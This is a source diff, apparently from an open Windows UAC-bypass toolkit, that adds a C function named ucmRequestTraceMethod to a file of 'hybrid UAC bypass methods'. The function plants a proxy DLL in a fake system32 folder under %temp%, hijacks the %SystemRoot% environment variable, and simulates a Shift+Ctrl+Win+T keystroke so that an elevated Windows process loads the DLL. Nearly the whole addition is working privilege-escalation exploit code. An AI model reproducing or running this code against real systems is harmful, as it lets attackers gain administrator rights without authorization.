@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2023
+*  (C) COPYRIGHT AUTHORS, 2015 - 2025
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.65
+*  VERSION:     3.67
 *
-*  DATE:        25 Sep 2023
+*  DATE:        11 Feb 2025
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1387,6 +1387,121 @@ NTSTATUS ucmIscsiCplMethod(
 #ifdef _DEBUG
     supSetGlobalCompletionEvent();
 #endif
+
+    return MethodResult;
+}
+
+/*
+* ucmRequestTraceMethod
+*
+* Purpose:
+*
+* Bypass UAC by environment variables hijack and dll planting.
+* https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
+*
+*/
+NTSTATUS ucmRequestTraceMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL fDirCreated = FALSE, fEnvSet = FALSE;
+    INT i;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    SIZE_T PayloadDirNameLen = 0, nLen;
+    WCHAR szBuffer[MAX_PATH + 1];
+    WCHAR szPayloadDir[MAX_PATH * 2];
+
+    UNICODE_STRING uStrTaskhost = RTL_CONSTANT_STRING(TASKHOSTW_EXE);
+
+    INPUT inputs[8];
+
+    do {
+        //
+        // Create destination dir "system32" in %temp%.
+        //
+        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
+        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
+        PayloadDirNameLen = _strlen(szPayloadDir);
+        if (!CreateDirectory(szPayloadDir, NULL)) {
+            if (GetLastError() != ERROR_ALREADY_EXISTS)
+                break;
+        }
+
+        fDirCreated = TRUE;
+
+        _strcat(szPayloadDir, TEXT("\\"));
+        _strcat(szPayloadDir, PERFORMANCETRACEHANDLER_DLL);
+        if (!supWriteBufferToFile(szPayloadDir, ProxyDll, ProxyDllSize))
+            break;
+
+        //
+        // Set new %SystemRoot% environment variable.
+        //
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+
+        nLen = _strlen(szBuffer);
+        if (szBuffer[nLen - 1] == L'\\') {
+            szBuffer[nLen - 1] = 0;
+        }
+
+        fEnvSet = supSetEnvVariable(FALSE, T_VOLATILE_ENV, T_SYSTEMROOT, szBuffer);
+        if (fEnvSet == FALSE)
+            break;
+
+        supEnumProcessesForSession(NtCurrentPeb()->SessionId,
+            (pfnEnumProcessCallback)supEnumTaskhostTasksCallback, (PVOID)&uStrTaskhost);
+
+        RtlSecureZeroMemory(&inputs[0], sizeof(inputs));
+
+        //
+        // Simulate LSHIFT+LCONTROL+LWIN+T.
+        //
+
+        inputs[0].type = INPUT_KEYBOARD;
+        inputs[0].ki.wVk = VK_LSHIFT;
+
+        inputs[1].type = INPUT_KEYBOARD;
+        inputs[1].ki.wVk = VK_LCONTROL;
+
+        inputs[2].type = INPUT_KEYBOARD;
+        inputs[2].ki.wVk = VK_LWIN;
+
+        inputs[3].type = INPUT_KEYBOARD;
+        inputs[3].ki.wVk = 'T';
+
+        inputs[4].type = INPUT_KEYBOARD;
+        inputs[4].ki.wVk = 'T';
+        inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;
+
+        inputs[5].type = INPUT_KEYBOARD;
+        inputs[5].ki.wVk = VK_LWIN;
+        inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;
+
+        inputs[6].type = INPUT_KEYBOARD;
+        inputs[6].ki.wVk = VK_LCONTROL;
+        inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;
+
+        inputs[7].type = INPUT_KEYBOARD;
+        inputs[7].ki.wVk = VK_LSHIFT;
+        inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;
+
+        SendInput(8, &inputs[0], sizeof(INPUT));
+
+        Sleep(5000);
+
+        MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
+
+    if (fEnvSet)
+        supSetEnvVariable(TRUE, T_VOLATILE_ENV, T_SYSTEMROOT, NULL);
+
+    if (fDirCreated) {
+        DeleteFile(szPayloadDir);
+        szPayloadDir[PayloadDirNameLen] = 0;
+        RemoveDirectory(szPayloadDir);
+    }
 
     return MethodResult;
 }
